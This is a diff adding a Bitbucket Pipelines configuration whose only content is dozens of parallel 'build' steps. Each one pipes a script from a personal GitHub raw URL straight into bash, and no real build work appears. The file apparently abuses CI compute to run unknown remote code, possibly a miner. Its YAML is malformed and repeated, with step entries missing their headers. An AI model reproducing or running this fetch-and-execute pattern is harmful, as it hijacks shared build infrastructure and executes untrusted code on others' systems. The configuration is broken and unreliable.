@@ -1,0 +1,498 @@
+options:
+  max-time: 120
+  size: 2x
+image: python:3.8
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+          name: build-1
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/var3 | bash
